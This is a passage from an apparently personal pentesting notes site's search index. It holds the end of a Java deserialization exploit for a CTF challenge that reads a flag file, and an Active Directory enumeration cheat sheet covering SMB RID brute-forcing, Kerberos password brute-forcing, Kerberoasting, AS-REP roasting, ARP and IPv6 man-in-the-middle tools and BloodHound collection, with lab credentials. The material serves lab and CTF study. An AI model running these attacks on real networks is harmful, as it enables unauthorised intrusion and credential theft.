class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport java.nio.charset.StandardCharsets\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport com.rootme.serial.OwnBase64\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport java.io.ByteArrayOutputStream\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport java.io.ObjectOutputStream\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport java.util.Base64\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epublic class Main \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    public static void main\u003cspan class=\"o\"\u003e(\u003c/span\u003eString\u003cspan class=\"o\"\u003e[]\u003c/span\u003e args\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        // Créer un tableau OwnBase64 avec la commande encodée\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        OwnBase64\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"nv\"\u003eencodedCommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e new OwnBase64\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;aGVhZA==\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e, new OwnBase64\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Li4vZmxhZy50eHQ=\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        DebugHelper \u003cspan class=\"nv\"\u003edebugHelper\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new DebugHelper\u003cspan class=\"o\"\u003e(\u003c/span\u003eencodedCommand, Boolean.TRUE\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        String \u003cspan class=\"nv\"\u003eserializedObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e serialize\u003cspan class=\"o\"\u003e(\u003c/span\u003edebugHelper\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        System.out.println\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;Serialized object: \u0026#34;\u003c/span\u003e + serializedObject\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eException e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            System.err.println\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;An error occurred during serialization/deserialization: \u0026#34;\u003c/span\u003e + e.getMessage\u003cspan class=\"o\"\u003e())\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            e.printStackTrace\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    public static String serialize\u003cspan class=\"o\"\u003e(\u003c/span\u003eObject item\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        final ByteArrayOutputStream \u003cspan class=\"nv\"\u003ebyteArrayOutputStream\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new ByteArrayOutputStream\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        final ObjectOutputStream objectOutputStream\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"nv\"\u003eobjectOutputStream\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new ObjectOutputStream\u003cspan class=\"o\"\u003e(\u003c/span\u003ebyteArrayOutputStream\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            objectOutputStream.writeObject\u003cspan class=\"o\"\u003e(\u003c/span\u003eitem\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            objectOutputStream.close\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            byte\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"nv\"\u003ebytes\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Base64.getEncoder\u003cspan class=\"o\"\u003e()\u003c/span\u003e.encode\u003cspan class=\"o\"\u003e(\u003c/span\u003ebyteArrayOutputStream.toByteArray\u003cspan class=\"o\"\u003e())\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e new String\u003cspan class=\"o\"\u003e(\u003c/span\u003ebytes, StandardCharsets.US_ASCII\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003eIOException e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            throw new Error\u003cspan class=\"o\"\u003e(\u003c/span\u003ee\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Deserialization"},{"content":"No Credentials: Nmap : nmap -Pn -sC -sV $t nmap -Pn -sC -sV -p- $t #full\rRustcan\nsudo nmap -sU -sC -sV $t\rSMB : nmap -Pn --script \u0026#34;smb-vuln*\u0026#34; -p139,445 $t #search smb vuln\rnetexec smb 10.10.65.99 -u \u0026#34;Guest\u0026#34; -p \u0026#34;\u0026#34; --shares netexec smb 10.10.65.99 -u user.txt -p user.txt --no-bruteforce --continue-on-success nxc smb $t -u UserNAme -p \u0026#39;PASSWORDHERE\u0026#39; --rid-brute proxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p \u0026#34;\u0026#34; --rid-brute | grep \u0026#39;\\\\\u0026#39; | cut -d $\u0026#39;\\\\\u0026#39; -f2 | cut -d \u0026#39; \u0026#39; -f1 | tee -a users_rid.txt\rSame: lookupsid.py sendai.vl/Guest@$t\rLDAP Search: nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; \u0026lt;IP\u0026gt; #Using anonymous credentials\rldapsearch -x -b \u0026#34;dc=baby2,dc=vl\u0026#34; -H ldap://10.10.119.153 \u0026#39;(ObjectClass=User)\u0026#39; sAMAccountName | grep sAMAccountName | awk \u0026#39;{print $2}\u0026#39;\rldapsearch -x -b \u0026#34;dc=baby2,dc=vl\u0026#34; -H ldap://10.10.119.153 | grep -i -a \u0026#39;Service Accounts\u0026#39;\rRPCClient : rpcclient -U=\u0026#34; \u0026#34; -N \u0026lt;dc-ip\u0026gt;\rKerbrute : kerbrute userenum --dc 10.10.11.129 -d search.htb /usr/share/wordlists/seclists/ kerbrute bruteuser --domain baby2.vl --dc $t /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt gpoadm -v #Bruteforce\rEnum4Linux : enum4linux-ng -A iP\rWindapsearch :\nwindapsearch -d \u0026lt;Domain Name\u0026gt; --dc-ip \u0026lt;Domain Controller IP\u0026gt; -U | tee windapsearch-enumeration-users\rWith Credentials: SMB : smbclient //10.10.196.22/SYSVOL -U library smbclient \\\\\\\\$t\\\\SYSVOL -U baby2/library smbclient.py \u0026#39;DOMAIN\u0026#39;/\u0026#39;USER\u0026#39;:\u0026#39;PASSWORD\u0026#39;@\u0026#39;DOMAIN_CONTROLLER\u0026#39;\rnetexec smb $t2 -u \u0026#39;rsmith\u0026#39; -p \u0026#39;IHateEric2\u0026#39; --shares netexec smb $t -u users.txt -p \u0026#34;\u0026#34; --no-bruteforce --continue-on-success #Null credential can reveal interesting path\rsamrdump.py \u0026lt;domain\u0026gt;/\u0026lt;username\u0026gt;:\u0026lt;password\u0026gt;@\u0026lt;target_IP\u0026gt;\rsmbmap -H IP -d \u0026lt;domainname\u0026gt; -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt;\rOn windows : net view \\\\dc01 /all\rLDAP Search: ldapsearch -x -H ldap://\u0026lt;IP\u0026gt; -D \u0026#39;\u0026lt;DOMAIN\u0026gt;\\\u0026lt;username\u0026gt;\u0026#39; -w \u0026#39;\u0026lt;password\u0026gt;\u0026#39; -b \u0026#34;DC=\u0026lt;1_SUBDOMAIN\u0026gt;,DC=\u0026lt;TLD\u0026gt;\u0026#34;\rldapsearch -H ldap://search.htb -x -D \u0026#39;username@search.htb\u0026#39; -w \u0026#34;passwords\u0026#34; -b \u0026#34;DC=search,DC=htb\u0026#34; \u0026#34;objectclass=user\u0026#34; sAMAccountName | grep sAMAccountName | awk -F\u0026#34;:\u0026#34; \u0026#39;{print $2}\u0026#39;\rnxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq nxc ldap $t -k -u users.txt -p \u0026#39;Cicada123\u0026#39; --kdcHost DC-JPQ225.cicada.vl\rBloodhound : bloodhound-python -d \u0026#39;LAB.TRUSTED.VL\u0026#39; -u \u0026#39;rsmith\u0026#39; -p \u0026#39;IHateEric2\u0026#39; -ns 10.10.245.166 -dc labdc.LAB.TRUSTED.VL -c all nxc ldap 10.10.202.37 -u Rhys.Garner -p knh1gJ8Xmeq+uP --bloodhound --collection All -ns 10.10.202.37\rOR\n./SharpHound.exe --CollectionMethods All Invoke-BloodHound -CollectionMethod All\rRPCClient : rpcclient -U=\u0026#34;username\u0026#34; \u0026lt;dc-ip\u0026gt;\rEnum4Linux :\nenum4linux -u username -p password -A \u0026lt;IP\u0026gt; enum4linux -u username -p password -U \u0026lt;IP\u0026gt;\rGetADUsers.py :\nGetADUsers.py -all pentesting.local/ippsec:Password12345 -dc-ip 192.168.10.50\rKerberoasting:\nGetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t GetUserSPNs.py breach.vl/Julia.wong:Computer1 -dc-ip $t -request\rfindDelegation.py -dc-ip 192.168.1.50 pentesting.local/ippsec:Password12345\rWindapsearch :\nwindapsearch -d \u0026lt;Domain Name\u0026gt; --dc-ip \u0026lt;Domain Controller IP\u0026gt; -u \u0026#34;domain\\\\username\u0026#34; -p \u0026#34;password\u0026#34; -U | tee winapsearch-authenticated-enumerations\rwindapsearch -d \u0026lt;Domain Name\u0026gt; --dc-ip \u0026lt;Domain Controller IP\u0026gt; -u \u0026#34;domain\\\\username\u0026#34; -p \u0026#34;password\u0026#34; -G | tee winapsearch-authentication-group-enumerations\rwindapsearch -d \u0026lt;Domain Name\u0026gt; --dc-ip \u0026lt;Domain Controller IP\u0026gt; -u \u0026#34;domain\\\\username\u0026#34; -p \u0026#34;password\u0026#34; --unconstrained-computers | tee unconstrained-computers-enumeration\rLdapdomaindump:\nldapdomaindump --user \u0026#34;delegate.vl\u0026#34;\\\\\u0026#34;N.Thompson\u0026#34; --password \u0026#34;KALEB_2341\u0026#34; --outdir ldapdomaindump \u0026#34;DC1.delegate.vl\u0026#34;\rOnly Username Impacket : GetNPUsers.py bruno.vl/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast\r# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported ASRepCatcher relay -dc $DC_IP # Disabling ARP spoofing, the mitm position must be obtained differently ASRepCatcher relay -dc $DC_IP --disable-spoofing # Passive listening of AS-REP packets, no packet alteration ASRepCatcher listen\rNetexec : netexec smb $t -u users.txt -p \u0026#34;\u0026#34; --no-bruteforce --continue-on-success\rDiscover windows : RunFinger.py -i 10.10.120.0/24\rDiscover machine mitm6 --interface \u0026#34;eth0\u0026#34;\rRead Users descriptions : nxc smb 192.168.250.170 -u \u0026#39;joker\u0026#39; -p \u0026#39;\u0026lt;3batman0893\u0026#39; --users\rDiscovering Pre-Created-computers : pre2k auth -u Bank -p \u0026#39;Password\u0026#39; -d lan.vl -dc-ip 10.10.10.10 -verbose\rMust check with your own script ","date":"2023-09-07","id":41,"permalink":"/notes/ad/discovery/","summary":"\u003ch2 id=\"no-credentials\"\u003eNo Credentials:\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eNmap\u003c/strong\u003e :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -Pn -sC -sV \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -Pn -sC -sV -p- \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e \u003cspan class=\"c1\"\u003e#full\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003e\u003ccode\u003eRustcan\u003c/code\u003e\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo nmap -sU -sC -sV \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eSMB  :\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -Pn --script \u003cspan class=\"s2\"\u003e\u0026#34;smb-vuln*\u0026#34;\u003c/span\u003e -p139,445 \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e \u003cspan class=\"c1\"\u003e#search smb vuln\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u \u003cspan class=\"s2\"\u003e\u0026#34;Guest\u0026#34;\u003c/span\u003e -p \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e --shares\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enetexec smb 10.10.65.99 -u user.txt -p user.txt --no-bruteforce --continue-on-success\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc smb \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -u UserNAme -p \u003cspan class=\"s1\"\u003e\u0026#39;PASSWORDHERE\u0026#39;\u003c/span\u003e --rid-brute\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxychains -q nxc smb 10.10.231.69 -u SVC_WEB_STAGING -d REFLECTION -p \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e --rid-brute \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep \u003cspan class=\"s1\"\u003e\u0026#39;\\\\\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e$\u0026#39;\\\\\u0026#39;\u003c/span\u003e -f2 \u003cspan class=\"p\"\u003e|\u003c/span\u003e cut -d \u003cspan class=\"s1\"\u003e\u0026#39; \u0026#39;\u003c/span\u003e -f1 \u003cspan class=\"p\"\u003e|\u003c/span\u003e tee -a users_rid.txt\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eSame:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elookupsid.py sendai.vl/Guest@\u003cspan class=\"nv\"\u003e$t\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eLDAP Search:\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enmap -n -sV --script \u003cspan class=\"s2\"\u003e\u0026#34;ldap* and not brute\u0026#34;\u003c/span\u003e \u0026lt;IP\u0026gt; \u003cspan class=\"c1\"\u003e#Using anonymous credentials\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldapsearch -x -b \u003cspan class=\"s2\"\u003e\u0026#34;dc=baby2,dc=vl\u0026#34;\u003c/span\u003e -H ldap://10.10.119.153 \u003cspan class=\"s1\"\u003e\u0026#39;(ObjectClass=User)\u0026#39;\u003c/span\u003e sAMAccountName \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep sAMAccountName \u003cspan class=\"p\"\u003e|\u003c/span\u003e awk \u003cspan class=\"s1\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eldapsearch -x -b \u003cspan class=\"s2\"\u003e\u0026#34;dc=baby2,dc=vl\u0026#34;\u003c/span\u003e -H ldap://10.10.119.153 \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -i -a \u003cspan class=\"s1\"\u003e\u0026#39;Service Accounts\u0026#39;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eRPCClient :\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erpcclient -U\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34; \u0026#34;\u003c/span\u003e -N \u0026lt;dc-ip\u0026gt;\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eKerbrute :\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekerbrute userenum --dc 10.10.11.129 -d search.htb /usr/share/wordlists/seclists/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ekerbrute bruteuser --domain baby2.vl --dc \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt gpoadm -v\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Bruteforce\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  